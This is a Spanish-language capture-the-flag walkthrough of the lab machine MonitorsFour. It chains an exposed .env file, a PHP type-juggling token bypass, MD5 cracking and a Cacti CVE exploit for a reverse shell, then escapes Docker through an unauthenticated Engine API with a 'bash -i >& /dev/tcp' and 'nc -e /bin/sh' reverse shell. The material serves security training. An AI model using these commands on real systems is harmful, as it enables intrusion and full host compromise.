
# MonitorsFour

<figure><img src="/files/L9UeZsHmtmFQ0taiKWgv" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `MonitorsFour`
* **IP:** `10.10.11.98`
* **Sistema operativo:** `Windows`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `23/12/2025`

***

## <mark style="color:purple;">Escaneo de puertos</mark>

#### Escaneo Simple

```bash
sudo nmap -v -sCV -T5 10.10.11.98
```

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Encontramos 2 puertos abiertos:

* `80 (HTTP)` - Servicio web
* `5985 (WinRM)` - Acceso con EvilWinRM con contraseña

#### /etc/passwd

Añadimos la IP `10.10.11.98` a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.98 monitorsfour.htb" | sudo tee -a /etc/hosts
```

***

## <mark style="color:purple;">Acceso web</mark>

Al acceder a la web parece una plataforma de servicios de networking e infraestructura:

<figure><img src="/files/ZQsevZ2ZqNeaPDyTyVuh" alt=""><figcaption></figcaption></figure>

Es una landing con distintas secciones, teniendo como único punto de acceso el login:

<figure><img src="/files/tNQlqxysEkec29lU9y5K" alt=""><figcaption></figcaption></figure>

Al intentar credenciales por defecto admin:admin nos muestra el error:

```
Invalid credentials, check your username and password then try again! 
```

Podríamos probar fuerza bruta pero vamos a enumerar más la máquina.

#### Burp Suite

Al capturar un login con BurpSuite vemos que la autenticación se hace mediante la API:

```
POST /api/v1/auth
```

<figure><img src="/files/IcUSVkZHojqKGL0lvAXF" alt=""><figcaption></figcaption></figure>

Y vemos que se pasan los parámetros username y password:

```
username=admin&password=admin
```

***

## <mark style="color:purple;">Enumeración web</mark>

### Testing de Formulario

* Probamos inyecciones SQL y XSS:
  * `' OR '1'='1`
  * `<script>alert(1)</script>`

Probamos distintas técnicas de inyección SQL/XSS sin éxito.

### Fuzzing de Directorios

```bash
dirsearch -u http://monitorsfour.htb -x 404,403

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_monitorsfour.htb/_25-12-23_20-27-43.txt

Target: http://monitorsfour.htb/

[20:27:43] Starting: 
[20:28:54] 200 -   97B  - /.env
[20:39:13] 200 -  367B  - /contact
[20:39:51] 200 -    4KB - /login
[20:40:42] 301 -  162B  - /static  ->  http://monitorsfour.htb/static/
[20:40:59] 200 -   35B  - /user
[20:41:03] 301 -  162B  - /views  ->  http://monitorsfour.htb/views/
```

Observamos que expone un archivo de variables de entorno, que al examinarlo encontramos credenciales de la base de datos MariaDB por el puerto 3306:

```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

Como el puerto 3306 no está expuesto externamente, necesitamos explorar otras formas de acceder a la base de datos.

### Análisis de vulnerabilidades

```bash
nuclei -u monitorsfour.htb
```

<figure><img src="/files/uAkFJ7bM39ZxLyvboUaL" alt=""><figcaption></figcaption></figure>

Nuclei nos muestra como `high` la variable de entorno que ya encontramos con fuzzing.

***

## <mark style="color:purple;">Enumeración de Subdominios (VHosts)</mark>

#### Fuzzing con FFUF

```bash
ffuf -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 138

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.monitorsfour.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 138
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 703ms]
```

**Encontramos el subdominio:** `cacti.monitorsfour.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de `Cacti Version 1.2.28`:

<figure><img src="/files/SAKeAwMFrouvE0z3hmDj" alt=""><figcaption></figcaption></figure>

#### Búsqueda de exploits

Encontramos que esta versión es vulnerable a SQL Injection en `host_templates.php` via parámetro `graph_template`

{% embed url="<https://www.cvedetails.com/version/1907377/Cacti-Cacti-1.2.28.html>" %}

Además, el endpoint `/user` se comporta de manera sospechosa.

* `curl http://monitorsfour.htb/user` -> `{"error":"Missing token parameter"}`
* `curl http://monitorsfour.htb/user?token=AAAA` -> `{"error":"Invalid or missing token"}`

Dado que el entorno ejecuta **PHP 8.3.27** , debemos investigar **el uso indebido de tipos** . En PHP, una comparación imprecisa (usando `==`en lugar de `===`) puede provocar un comportamiento inesperado al comparar diferentes tipos de datos.

Los “hashes mágicos” específicos (cadenas que comienzan con 0e seguidas de números) son tratados como notación científica (flotante) 0 por PHP durante una comparación flexible.

* `"0e1234" == "0e9999"` se evalúa como `TRUE` porque ambos son efectivamente `0`.
* `"0e1234" == 0` evalúa a `TRUE`.

Probando con este script

{% code title="test-magic-bytes.sh" %}

```bash
# Test with "magic" values that equal 0 in loose comparison
magic_values=("0" "0e0" "0e1" "0e12345" "00" "0x0" "0.0" "0 " " 0")

for value in "${magic_values[@]}"; do
  echo -n "Testing token=$value -> "
  curl -s "http://monitorsfour.htb/user?token=$value" | jq -r '.error // "SUCCESS!"'
done

# Also try common "magic hashes"
# MD5 hashes that start with "0e" and contain only digits after
magic_hashes=(
  "0e215962017"
  "0e462097431906509019562988736854"
  "0e1137126905"
  "0e291242476940776845150308577824"
  "0e656258624"
)

for hash in "${magic_hashes[@]}"; do
  echo -n "Testing MD5 magic hash: $hash -> "
  curl -s "http://monitorsfour.htb/user?token=$hash" | jq -r '.error // "SUCCESS!"'
done
```

{% endcode %}

Obtenemos lo siguiente:

```
bash test-magic-bytes.sh
     
Testing token=0 -> jq: error (at <stdin>:0): Cannot index array with string "error"
Testing token=0e0 -> jq: error (at <stdin>:0): Cannot index array with string "error"
Testing token=0e1 -> jq: error (at <stdin>:0): Cannot index array with string "error"
Testing token=0e12345 -> jq: error (at <stdin>:0): Cannot index array with string "error"
Testing token=00 -> jq: error (at <stdin>:0): Cannot index array with string "error"
Testing token=0x0 -> Invalid or missing token
Testing token=0.0 -> jq: error (at <stdin>:0): Cannot index array with string "error"
Testing token=0  -> Testing token= 0 -> Testing MD5 magic hash: 0e215962017 -> jq: error (at <stdin>:0): Cannot index array with string "error"
Testing MD5 magic hash: 0e462097431906509019562988736854 -> jq: error (at <stdin>:0): Cannot index array with string "error"
Testing MD5 magic hash: 0e1137126905 -> jq: error (at <stdin>:0): Cannot index array with string "error"
Testing MD5 magic hash: 0e291242476940776845150308577824 -> jq: error (at <stdin>:0): Cannot index array with string "error"
Testing MD5 magic hash: 0e656258624 -> jq: error (at <stdin>:0): Cannot index array with string "error"
```

El error de `jq` significa que la respuesta es diferente. Cuando `jq` indica "Cannot index array with string "error"", significa que la respuesta no es JSON con un campo "error"; es:

1. **Respuesta vacía**
2. **Estructura diferente**
3. **¡Exitoso!**

Con esto hemos descubierto una **vulnerabilidad de Type Juggling en PHP** que nos permite **bypassear la autenticación** usando tokens "mágicos". Vamos a explotar esto sistemáticamente.

### Descubrimiento de tokens válidos <a href="#id-9bff" id="id-9bff"></a>

La prueba de tokens específicos reveló respuestas JSON válidas que contienen datos del usuario:

```bash
# Prueba los tokens que generaron errores jq
TOKENS=("0" "0e0" "0e1" "0e12345" "00" "0x0" "0.0" "0 " " 0" "0e215962017" "0e462097431906509019562988736854")

for token in "${TOKENS[@]}"; do
    echo "=== Probando token: '$token' ==="
    curl -s "http://monitorsfour.htb/user?token=$token"
    echo ""
done
```

<figure><img src="/files/tKFOOgeYMSWD7kIHecrt" alt=""><figcaption></figcaption></figure>

Con esto obtenemos **acceso a la base de datos completa de usuarios** incluyendo el administrador. Tenemos hashes de contraseñas MD5 y tokens. Vamos a explotar esto.

### Cracking de hashes

```bash
# Crear archivo con hashes
echo "56b32eb43e6f15395f6c46c1c9e1cd36" > hashes.txt
echo "69196959c16b26ef00b77d82cf6eb169" >> hashes.txt
echo "2a22dcf99190c322d974c8df5ba3256b" >> hashes.txt
echo "8d4a7e7fd08555133e056d9aacb1e519" >> hashes.txt
```

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
wonderful1       (?)
```

Obtenemos una contraseña en plano: `wonderful1` pero no sabemos a que usuario pertenece, vamos a comprobarlo:

```bash
echo -n "wonderful1" | md5sum

56b32eb43e6f15395f6c46c1c9e1cd36
```

Se corresponde al hash de admin!

```
"email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36"
```

Por lo que vamos a acceder a través de la web principal:

<figure><img src="/files/LUAbUctOUhzV97O8uzEo" alt=""><figcaption></figcaption></figure>

Estamos dentro!

***

## <mark style="color:purple;">Enumeración interna</mark>

En la pestaña users vemos los 4 usuarios del sistema y sus roles, aunque no podemos ver las contraseñas en plano:

<figure><img src="/files/y1erAQnVZsMh10x6l3Hr" alt=""><figcaption></figcaption></figure>

Observamos que el usuario admin se llama Marcus, por lo que probaremos a loguearnos con las credenciales `marcus:wonderful1` en Cacti, y efectivamente, funciona:

<figure><img src="/files/IBxJNwC4mDDEv6ZigqZJ" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Explotación de Cacti</mark>

### CVE-2025–24367 <a href="#id-63af" id="id-63af"></a>

Utilizamos la prueba de concepto para CVE-2025–24367 de GitHub para obtener acceso inicial:

{% embed url="<https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC>" %}

### Ejecución del Exploit

```
python3 exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i 10.10.15.211 -l 4444

[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: Md6ea.php
[+] Got payload: /bash
[i] Created PHP filename: s5JKr.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```

<figure><img src="/files/LU6icId5zvauKfwGWLpo" alt=""><figcaption></figcaption></figure>

Tenemos una shell como www-data:

```shellscript
www-data@821fbd6a43fa:~/html/cacti$ whoami
www-data

www-data@821fbd6a43fa:~/html/cacti$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

## <mark style="color:purple;">User Flag</mark>

Accedemos a `/home` y encontramos la user flag en el directorio `marcus`:

```bash
www-data@821fbd6a43fa:~/html/cacti$ cd /home
www-data@821fbd6a43fa:/home$ ls
marcus

www-data@821fbd6a43fa:/home$ cd marcus
www-data@821fbd6a43fa:/home/marcus$ ls
user.txt

www-data@821fbd6a43fa:/home/marcus$ cat user.txt
fa9d2a38627b196cba405e**********
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

#### Archivos sospechosos encontrados <a href="#id-6065" id="id-6065"></a>

* **`create_container.json`**- ¡Crea un contenedor con montaje de enlace de raíz de host!

```shellscript
www-data@821fbd6a43fa:~/html$ cat create_container.json

{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/sh", "-c", "nc -e /bin/sh 10.10.14.83 60002"],
  "HostConfig": {
    "Binds": ["/host_root:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
```

* **`resp.json`**- Respuesta de creación de contenedor (ID: `804093e6aa39...`)

```bash
www-data@821fbd6a43fa:~/html$ cat resp.json

{"Id":"88b8c49eca6198a71dd44f966c0e852aa2f885222b451a67e5cc2bfc2bd0cc00","Warnings":[]}
```

#### Topología de red

```shellscript
www-data@821fbd6a43fa:~/html$ ip route

default via 172.18.0.1 dev eth0 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.3 
```

Confirmando que estamos dentro de un contenedor, por lo que haremos un Docker Escape.

### Enumerando el contenedor

```shellscript
www-data@821fbd6a43fa:/$ uname -a
Linux 821fbd6a43fa 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 GNU/Linux
```

### Explotación de la API de Docker Engine <a href="#id-97bb" id="id-97bb"></a>

La API de Docker Engine estaba disponible en  `http://192.168.65.7:2375`. Se creó un nuevo contenedor privilegiado con acceso al sistema de archivos del host para acceder al host.

#### **1. Verificar acceso a Docker API**

{% code overflow="wrap" %}

```bash
www-data@821fbd6a43fa:~/html/cacti$ curl -s http://192.168.65.7:2375/version

{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"28.3.2","Details":{"ApiVersion":"1.51","Arch":"amd64","BuildTime":"2025-07-09T16:13:55.000000000+00:00","Experimental":"false","GitCommit":"e77ff99","GoVersion":"go1.24.5","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.27","Details":{"GitCommit":"05044ec0a9a75232cad458027ca83437aae3f4da"}},{"Name":"runc","Version":"1.2.5","Details":{"GitCommit":"v1.2.5-0-g59923ef"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"28.3.2","ApiVersion":"1.51","MinAPIVersion":"1.24","GitCommit":"e77ff99","GoVersion":"go1.24.5","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","BuildTime":"2025-07-09T16:13:55.000000000+00:00"}
```

{% endcode %}

#### 2. Abrir listeners en Kali

```
nc -lvnp 9001
```

#### 3. Creación del contenedor vía Docker Engine API

{% code overflow="wrap" %}

```shellscript
curl -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true,
      "NetworkMode": "host"
    },
    "Cmd": ["sh", "-c", "chroot /host /bin/bash -c \"bash -i >& /dev/tcp/10.10.15.211/9001 0>&1\""]
  }'
```

{% endcode %}

Eso nos generará un ID del nuevo contenedor:

```
{"Id":"240b931db7b96b3c9c073b1882e5506ff06ba67f871c1ad001e8242ba7891225","Warnings":[]}
```

#### **3. Arrancar contenedor y recibir la root shell**

{% code overflow="wrap" %}

```bash
curl -X POST http://192.168.65.7:2375/containers/240b931db7b96b3c9c073b1882240b931db7b96b3c9c073b1882e5506ff06ba67f871c1ad001e8242ba7891225/start
```

{% endcode %}

<figure><img src="/files/u9odP8MBFYiwj29lb0ty" alt=""><figcaption></figcaption></figure>

***

## 👑 <mark style="color:purple;">Root Flag</mark>

### Post-explotación y captura de root flag <a href="#id-4610" id="id-4610"></a>

#### Análisis del sistema de archivos del host <a href="#id-1fcd" id="id-1fcd"></a>

El sistema de archivos del host se montó en `/mnt/host`. Se podía acceder a la unidad `C:` de Windows mediante `/mnt/host/c`.

```shellscript
root@docker-desktop:~# ls /mnt/host/c/Users/Administrator/Desktop

desktop.ini
root.txt
```

Y solo nos quedaría leer la flag:

```bash
root@docker-desktop:~# cat /mnt/host/c/Users/Administrator/Desktop/root.txt

4009b0b3d45cd2ff010e50**********
```
